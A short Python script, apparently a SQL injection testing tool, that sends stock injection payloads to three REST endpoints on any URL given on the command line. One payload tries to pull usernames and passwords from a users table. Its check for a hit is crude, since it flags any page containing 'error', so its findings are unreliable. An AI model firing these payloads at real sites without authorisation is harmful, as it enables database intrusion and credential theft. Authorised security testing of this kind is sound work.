import requests
import argparse

# List of common SQL injection payloads
sql_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR '1'='1' --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT username, password FROM users --"
]

# Endpoints to test for SQL Injection (examples)
endpoints = [
    "/rest/products/search?q=",
    "/rest/user/whoami?q=",
    "/rest/user/change-password?q="
]

# Function to test SQL injection vulnerabilities
def test_sql_injection(base_url, endpoints, sql_payloads):
    vulnerable_urls = []  # List to store URLs where vulnerabilities are detected

    for endpoint in endpoints:
        for payload in sql_payloads:
            # Construct the full URL with the payload
            url = base_url + endpoint + payload
            try:
                # Send the request to the server
                response = requests.get(url)
                
                # Check if the payload causes an SQL error or unexpected behavior
                if "SQL" in response.text or "syntax" in response.text or "error" in response.text:
                    print(f"[+] SQL Injection vulnerability detected at {url}")
                    vulnerable_urls.append(url)  # Add the vulnerable URL to the list
                else:
                    print(f"[-] No SQL Injection vulnerability at {url}")
            except Exception as e:
                print(f"Error testing {url}: {str(e)}")
    
    return vulnerable_urls  # Return the list of vulnerable URLs

# Main function to parse command line arguments
def main():
    parser = argparse.ArgumentParser(description="SQL Injection Testing Tool")
    parser.add_argument("website", help="The base URL of the website to test for SQL Injection vulnerabilities")
    args = parser.parse_args()

    base_url = args.website
    vulnerable_urls = test_sql_injection(base_url, endpoints, sql_payloads)

    # Print the list of URLs where vulnerabilities were detected
    if vulnerable_urls:
        print("\n[!] SQL Injection vulnerabilities were detected at the following URLs:")
        for url in vulnerable_urls:
            print(f" - {url}")
    else:
        print("\n[+] No SQL Injection vulnerabilities were detected.")

if __name__ == "__main__":
    main()